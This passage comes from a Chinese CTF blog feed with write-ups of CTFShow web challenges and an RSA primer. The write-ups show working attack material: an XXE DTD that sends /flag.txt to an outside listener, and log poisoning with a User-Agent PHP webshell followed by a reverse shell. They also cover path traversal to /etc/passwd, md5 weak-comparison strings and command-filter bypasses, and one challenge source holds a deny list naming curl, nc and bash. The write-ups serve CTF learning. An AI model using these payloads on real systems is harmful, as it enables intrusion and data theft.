            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token function">openssl_encrypt</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'bf-ecb'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'5a78dbb4'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>

<p>得到<code>N6bf8Bd8jm0SpmTZGl0isw==</code>，为<code>config.php</code>加密后的<code>base64</code>码，访问<code>/showImage.php?image=N6bf8Bd8jm0SpmTZGl0isw==</code>，F12打开复制代码base64解密得到<code>config.php</code>的内容，<code>flag</code>即在其中。</p>
<h3 id="Web4-观心"><a href="#Web4-观心" class="headerlink" title="Web4_观心"></a>Web4_观心</h3><p>抓包发现有<code>api.php</code>文件，并且带有请求<code>api</code>和<code>city</code>两个数据</p>
<p><code>api</code>携带的是一个网址，是一个xml文件，由此判断考的应该是XXE外部实体注入</p>
<p>于是构建攻击环境</p>
<p>在公网服务器上编写两个文件</p>
<p>xxe.xml</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span><span class="token punctuation">[</span><span class="token internal-subset">
	&lt;!ENTITY % dtd SYSTEM "http://ip/xxe.dtd">
	%dtd;
</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>woojay<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pass</span><span class="token punctuation">></span></span>password<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pass</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre>

<p>xxe.dtd</p>
<pre class="language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag.txt&quot;&gt;
&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;xxx.xx:5000&#x2F;%file;&#39;&gt;&quot;&gt;
%int;
%send;</code></pre>

<p>随后在服务器上监听5000端口，即可得到<code>flag.txt</code>的 <code>base64</code>编码后的结果，解码既是flag</p>
<p>不监听端口也可以，直接发包请求，会把报错的结果返回，如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/CTFSHOW-WEB_AK%E8%B5%9B/image-20200804113715125.png" alt loading="lazy"></p>
<p>XXE这块不是很了解，原理后面再仔细研究一下</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF题</tag>
      </tags>
  </entry>
  <entry>
    <title>RSA算法浅析</title>
    <url>/posts/aa76c91b/</url>
    <content><![CDATA[<h3 id="数论知识"><a href="#数论知识" class="headerlink" title="数论知识"></a>数论知识</h3><ol>
<li><p><strong>互质</strong>：如果两个正整数，除了 1 以外没有其他的公因数，则他们互质。比如，14 和 15 互质。注意，两个数构成互质关系，他们不一定需要是质数，比如 7 和 9。</p>
</li>
<li><p><strong>欧拉函数</strong>：用于计算任意正整数 <code>n</code>，在 <code>&lt;=n</code> 的正整数中，与 <code>n</code> 互质的正整数个数。</p>
</li>
<li><p><strong>欧拉定理</strong>：如果两个正整数 a 和 n 互质，则如下等式成立。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/RSA%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/image-20200801173237556.png" alt loading="lazy"></p>
</li>
<li><p><strong>费马小定理</strong>：欧拉函数中的一个特殊情况，如果  <code>n</code>  是质数，而 <code>a</code> 不是 <code>n</code> 的倍数，此时 <code>a</code> 和 <code>n</code> 必然互质。因为<code>n</code>的欧拉函数值 = <code>n-1</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/RSA%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/image-20200801173548812.png" alt loading="lazy"></p>
</li>
<li><p><strong>模反元素</strong>：如果两个正整数 <code>a</code> 和 <code>n</code> 互质，那么一定可以找到一个正整数 <code>b</code>，使得 <code>ab - 1</code> 被 <code>n</code> 整除。这个时候，<code>b</code> 就叫做 <code>a</code> 的 模反元素。</p>
</li>
</ol>
<h3 id="关键参数"><a href="#关键参数" class="headerlink" title="关键参数"></a>关键参数</h3><p><code>(e,n)</code>：公钥</p>
<p><code>(d,n)</code>：私钥</p>
<p><code>p,q</code>：<code>n=p*q</code> ，<code>p</code>和<code>q</code>都是两个大素数</p>
<p><code>c</code>：密文</p>
<p><code>m</code>：明文</p>
<p><code>n,e</code>是公开的情况下，想要知道<code>d</code>的值，必须要将<code>n</code>分解计算出<code>n</code>的欧拉函数值，而<code>n</code>是两个大素数<code>p，q</code>的乘积，将其分解是困难的。</p>
<h3 id="生成密钥"><a href="#生成密钥" class="headerlink" title="生成密钥"></a>生成密钥</h3><p>取两个大质数<code>p,q</code>，并计算他们的乘积<code>n</code>，一般要求<code>n</code>换算成二进制要大于2048位</p>
<p>则根据欧拉定理满足以下条件（欧拉函数）：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/RSA%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/image-20200801172139842.png" alt loading="lazy"></p>
<p>计算<code>n</code>的欧拉函数值</p>
<p>选择一个数<code>e</code>使得<code>e</code>与<code>n</code>的欧拉函数值互质，一般选择65537</p>
<p>计算<code>e</code>相对<code>n</code>的欧拉函数值的模反元素<code>d</code>，因为<code>e</code>与<code>n</code>的欧拉函数值互质，则根据模反元素的性质</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/RSA%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/image-20200801172706077.png" alt loading="lazy"></p>
<p>根据扩展欧几里得算法，通过迭代求解即可解出<code>d</code>，随后即生成公钥<code>(e,N)</code>，私钥<code>(d,N)</code></p>
<h3 id="加解密的实现"><a href="#加解密的实现" class="headerlink" title="加解密的实现"></a>加解密的实现</h3><p>加密：</p>
<p><code>m</code>为要加密的信息，<code>(e,n)</code>组合起来为公钥，<code>c</code>和<code>k</code>分别为常数</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/RSA%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/image-20200801211116338.png" alt loading="lazy"></p>
<p>解密：</p>
<p><code>m</code>为要解密的信息，<code>(d,n)</code>组合起来为私钥，<code>c</code>和<code>k</code>分别为常数</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/RSA%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/image-20200801211144409.png" alt loading="lazy"></p>
<p>两个公式可相互推导</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>36D杯五道代码审计题</title>
    <url>/posts/e53b958d/</url>
    <content><![CDATA[<p>“温故而知新，可以为师矣”——孔子《论语》</p>
<span id="more"></span>

<h3 id="WEB-ALL-INFO-U-WANT"><a href="#WEB-ALL-INFO-U-WANT" class="headerlink" title="WEB_ALL_INFO_U_WANT"></a>WEB_ALL_INFO_U_WANT</h3><p>访问<code>index.php.bak</code>得到源码：</p>
<pre class="language-php" data-language="php"><code class="language-php">
visit all_info_u_want.php and you will get all information you want

= =Thinking that it may be difficult, i decided to show you the source code:


<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//give you all information you want</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'all_info_i_want'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/var/www/html/"</span> <span class="token operator">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token comment">//really baby include</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span>



really really really baby challenge right? </code></pre>

<p>根据源码提示传入<code>all_info_u_want.php?all_info_i_want</code>，得到<code>phpinfo()</code>的结果，<code>flag</code>并不在这里</p>
<p>传入<code>all_info_u_want.php?file=../../../../../../etc/passwd</code>，可以看到<code>/etc/passwd</code>的内容，目录穿越，再传入<code>all_info_u_want.php?file=../../../../../../flag</code>试图读取flag，得到信息如下：</p>
<p><code>flag&#123;this_is_fake_flag_realflag_is_in_/etc_find_it_by_yourself&#125;</code></p>
<p>根据提示可以知道flag应该在<code>etc</code>目录下，慢猜不好搞，没那个运气</p>
<p>先来看看用的是什么web服务器，抓包可以看到是<code>Nginx</code>服务器，尝试读取<code>Nginx</code>的敏感信息文件，网上查得<code>Nginx</code>的访问日志文件默认路径为<code>/var/log/nginx/access.log</code>，尝试读取，得到日志文件结果，该日志文件回保存访问的<code>User-Agent</code>的内容，结合文件包含，我们可以在<code>User-Agent</code>中注入恶意代码，从而<code>getshell</code>，</p>
<pre class="language-none"><code class="language-none">GET &#x2F;all_info_u_want.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log HTTP&#x2F;1.1
Host: 16636aaf-35bc-4ac1-993c-95897de4ec8e.chall.ctf.show
User-Agent: &lt;?php phpinfo();?&gt;</code></pre>

<p>成功执行php代码，于是传入<code>User-Agent: &lt;?php eval($_POST[&#39;pass&#39;]);?&gt;</code></p>
<p>利用pass反弹shell后执行<code>find etc -name &quot;*&quot; | xargs grep &quot;flag&#123;&quot;</code>，得到flag</p>
<h3 id="WEB-WUSTCTF朴实无华Revenge"><a href="#WEB-WUSTCTF朴实无华Revenge" class="headerlink" title="WEB_WUSTCTF朴实无华Revenge"></a>WEB_WUSTCTF朴实无华Revenge</h3><p>拿到题目得到源码：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function-definition function">isPalindrome</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$len</span><span class="token operator">=</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$l</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token variable">$k</span><span class="token operator">=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$len</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token variable">$k</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$j</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$len</span><span class="token operator">-</span><span class="token variable">$j</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$l</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$l</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//level 1</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$numPositve</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 获取变量的整数值</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$num</span> <span class="token operator">!=</span> <span class="token variable">$numPositve</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$numReverse</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 反转字符串</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^0-9.-]/'</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"非洲欢迎你1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$numPositve</span> <span class="token operator">&lt;=</span> <span class="token operator">-</span><span class="token number">999999999999999999</span> <span class="token operator">||</span> <span class="token variable">$numPositve</span> <span class="token operator">>=</span> <span class="token number">999999999999999999</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//在64位系统中 intval()的上限不是2147483647 省省吧</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"非洲欢迎你2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$numPositve</span> <span class="token operator">===</span> <span class="token variable">$numReverse</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isPalindrome</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"金钱解决不了穷人的本质问题"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"去非洲吧1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//level 2</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$md5</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br>"</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//get flag</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">,</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"more"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tail"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"less"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"head"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tac"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"$"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sort"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"curl"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nc"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"bash"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br>"</span><span class="token punctuation">;</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"快到非洲了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>先一层层绕过，首先第一个<code>if</code>，传入num，简单来说就是</p>
<ul>
<li>num结果取整后和原来的字符串需要相等，但是这里只需要<code>==</code>即可</li>
<li>num需要为数字，取整后的数字不能小于-999999999999999999或者大于999999999999999999</li>
<li>num在经过取整和反转字符串后取整后的数字需要相等</li>
<li>num经过<code>isPalindrome</code>函数返回的值需要为<code>false</code></li>
</ul>
<p>再来看看<code>isPalindrome</code>函数，字符串两边对称的数字需要有不一样，才能使<code>$l=0</code>，返回<code>false</code>这样与前面的条件就矛盾了，反转后又需要相等，又不能对称。</p>
<p>以下提供两种绕过方式：</p>
<pre class="language-none"><code class="language-none">00.0
1000000000000000.00000000000000010</code></pre>

<p>第一种确实是没有任何操作就直接绕过了，而第二种则是浮点数的精度问题，在服务器上</p>
<p><code>var_dump(intval(1000000000000000.00000000000000010) === intval(strrev(1000000000000000.00000000000000010)));</code></p>
<p>是可以返回true的，但是我在本地测试到</p>
<p><code>var_dump(intval(1000000.00000010) === intval(strrev(1000000.00000010)));</code></p>
<p>就返回false了，不知道什么鬼-.-</p>
<p>再绕过第二个if</p>
<p>这个需要让<code>$md5==md5(md5($md5))</code>，弱比较，绕如果md5=0exxxxxxxx，经过两次md5加密后的md5值也为0exxxxxxxx，即可绕过</p>
<p>写个脚本爆破即可，这样的字符串挺多的，以下列举几个：</p>
<pre class="language-none"><code class="language-none">0e3900184182-&gt;0e141872119030269772765275363795
0e6201668706-&gt;0e798542257494932620650241948633
0e6702291282-&gt;0e100506350380765096811441821816
0e1808236718-&gt;0e935567136545220553710393252752
0e9507776345-&gt;0e884606274470724143653948404543
0e7208324299-&gt;0e029637360083197154652141201992
0e2010692162-&gt;0e514898998879174336203746127058
0e9410970854-&gt;0e430279023649905390706560476083
0e3511282263-&gt;0e657335831331991043075342997270</code></pre>

<p>再到最后get flag</p>
<p>过滤了挺多的命令，但是还是可以绕过：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">nl<span class="token operator">&lt;</span>/flag<span class="token operator">|</span><span class="token function">nl</span>
rev<span class="token operator">&lt;</span>/flag<span class="token operator">|</span><span class="token function">rev</span></code></pre>

<p>随后即可拿到flag</p>
<h3 id="WEB-WUSTCTF朴实无华Revenge-Revenge"><a href="#WEB-WUSTCTF朴实无华Revenge-Revenge" class="headerlink" title="WEB_WUSTCTF朴实无华Revenge_Revenge"></a>WEB_WUSTCTF朴实无华Revenge_Revenge</h3><p>源码：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function-definition function">isPalindrome</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$len</span><span class="token operator">=</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$l</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
